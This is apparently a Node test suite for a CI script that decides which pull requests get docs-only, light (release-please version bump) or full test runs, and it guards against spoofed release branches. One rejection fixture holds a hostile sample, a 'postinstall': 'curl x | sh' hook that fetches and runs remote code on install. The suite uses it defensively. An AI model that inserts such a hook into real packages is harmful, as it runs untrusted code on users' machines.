// Run with `node --test .github/scripts/` (the `changes` job in ci.yml does, before trusting the result).
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { describe, it } from "node:test";
import { changesOnlyVersions, classify, isDocPath } from "./ci-tier.mjs";

const fixture = (name) => JSON.parse(readFileSync(new URL(`./fixtures/${name}`, import.meta.url), "utf8"));
const files = (...names) => names.map((filename) => ({ filename }));
const pr = (extra) => ({ event: "pull_request", headRef: "feat/x", sameRepo: true, ...extra });

describe("which events get which tier", () => {
  it("runs only CodeQL on a push to master", () => {
    assert.equal(classify({ event: "push" }).tier, "push");
  });

  it("runs everything for a manual run or any event it does not know", () => {
    assert.equal(classify({ event: "workflow_dispatch" }).tier, "full");
    assert.equal(classify({ event: "schedule" }).tier, "full");
  });

  it("runs everything when it cannot see the changed files", () => {
    assert.equal(classify(pr({ files: undefined })).tier, "full");
    assert.equal(classify(pr({ files: [] })).tier, "full");
    assert.equal(classify(pr({ files: Array.from({ length: 3000 }, (_, i) => ({ filename: `docs/${i}.md` })) })).tier, "full");
  });
});

describe("documentation-only pull requests", () => {
  it("are recognised", () => {
    assert.equal(classify(pr({ files: files("docs/testing.md", "README.md", "protocol/federation.md", "client/README.md") })).tier, "docs");
  });

  it("are not when a single code or config file comes along", () => {
    for (const code of ["server/src/app.ts", "client/src/App.tsx", ".github/workflows/ci.yml", "package.json", "charts/federated-chat-app/values.yaml", "server/prisma/schema.prisma", "docker-compose.yml"]) {
      assert.equal(classify(pr({ files: files("docs/testing.md", code) })).tier, "full", code);
    }
  });

  it("are not when a code file is renamed into docs, because the old location counts too", () => {
    const moved = [{ filename: "docs/old-script.md", previous_filename: "server/src/lib/auth.ts" }];
    assert.equal(classify(pr({ files: moved })).tier, "full");
  });

  it("only count real doc paths", () => {
    assert.ok(isDocPath("docs/deployment/docker.md"));
    assert.ok(isDocPath("protocol/federation.md"));
    assert.ok(isDocPath("CHANGELOG.md"));
    assert.ok(isDocPath("anything/at/all/NOTES.MD"));
    assert.ok(!isDocPath("server/src/docs.ts"));
    assert.ok(!isDocPath("docsify/index.js"));
    assert.ok(!isDocPath("protocols/x.ts"));
    assert.ok(!isDocPath("scripts/notes.md.sh"));
  });
});

describe("release-please pull requests", () => {
  const release = (extra = {}) => ({ event: "pull_request", headRef: "release-please--branches--master--components--my-chat-app", sameRepo: true, ...extra });

  it("recognises a real release PR (the file list and patches of #118)", () => {
    const result = classify(release({ files: fixture("release-pr-118.json") }));
    assert.equal(result.tier, "light", result.reason);
  });

  it("does not trust the branch name alone: a dependency change in a release-named branch runs everything", () => {
    const files = [...fixture("release-pr-118.json"), ...fixture("dependency-pr-125.json").filter((f) => f.filename === "package-lock.json")];
    // Same file name appears twice here; what matters is that the dependency patch is judged on its lines.
    const onlyDependency = fixture("dependency-pr-125.json");
    assert.equal(classify(release({ files: onlyDependency })).tier, "full");
    assert.equal(classify(release({ files })).tier, "full");
  });

  it("does not skip when any source file comes along", () => {
    const files = [...fixture("release-pr-118.json"), { filename: "server/src/app.ts", patch: "+x" }];
    assert.equal(classify(release({ files })).tier, "full");
  });

  it("does not apply to a pull request from a fork, whatever its branch is called", () => {
    assert.equal(classify(release({ files: fixture("release-pr-118.json"), sameRepo: false })).tier, "full");
  });

  it("does not apply to a branch merely containing the name", () => {
    assert.equal(classify(release({ files: fixture("release-pr-118.json"), headRef: "fix/release-please--x" })).tier, "full");
  });

  it("does not trust a version file whose patch it cannot see", () => {
    const files = [{ filename: "package-lock.json" }, { filename: "package.json", patch: '-  "version": "0.11.0",\n+  "version": "0.12.0",' }];
    assert.equal(classify(release({ files })).tier, "full");
  });

  it("does not trust a renamed version file", () => {
    const files = [{ filename: "package.json", previous_filename: "old/package.json", patch: '-  "version": "0.11.0",\n+  "version": "0.12.0",' }];
    assert.equal(classify(release({ files })).tier, "full");
  });
});

describe("changesOnlyVersions", () => {
  it("accepts every version-line shape release-please writes", () => {
    for (const line of [
      '-  "version": "0.11.0",\n+  "version": "0.12.0",',
      '-version = "0.11.0"\n+version = "0.12.0"',
      "-version: 0.11.0\n+version: 0.12.0",
      '-appVersion: "0.11.0"\n+appVersion: "0.12.0"',
      '-  ".": "0.11.0"\n+  ".": "0.12.0"',
      '-  "version": "0.11.0"\n+  "version": "0.12.0-rc.1"',
    ]) {
      assert.ok(changesOnlyVersions(`@@ -1,3 +1,3 @@\n context\n${line}\n context`), line);
    }
  });

  it("rejects anything else, including a dependency pin that looks like a version", () => {
    for (const line of [
      '-    "left-pad": "1.2.3"\n+    "left-pad": "1.3.0"',
      '+  "scripts": { "test": "vitest" },',
      '-      "resolved": "https://registry.npmjs.org/x/-/x-1.0.0.tgz",\n+      "resolved": "https://registry.npmjs.org/x/-/x-1.1.0.tgz",',
      '+      "integrity": "sha512-abc",',
      '-  "version": "0.11.0",\n+  "version": "0.12.0",\n+  "postinstall": "curl x | sh",',
      '-version = "0.11.0"\n+version = "0.12.0"\n+evil = "1.0.0"',
    ]) {
      assert.ok(!changesOnlyVersions(`@@ -1,3 +1,3 @@\n${line}`), line);
    }
  });

  it("rejects an empty or missing patch", () => {
    assert.ok(!changesOnlyVersions(""));
    assert.ok(!changesOnlyVersions(undefined));
    assert.ok(!changesOnlyVersions("@@ -1 +1 @@\n context only"));
  });

  it("rejects the real patch of a dependency-adding pull request (#125's lockfile)", () => {
    const lock = fixture("dependency-pr-125.json").find((f) => f.filename === "package-lock.json");
    assert.ok(lock.patch.length > 200);
    assert.ok(!changesOnlyVersions(lock.patch));
  });

  it("accepts the real patches of the release pull request (#118)", () => {
    for (const f of fixture("release-pr-118.json").filter((f) => f.filename !== "CHANGELOG.md")) {
      assert.ok(changesOnlyVersions(f.patch), f.filename);
    }
  });
});
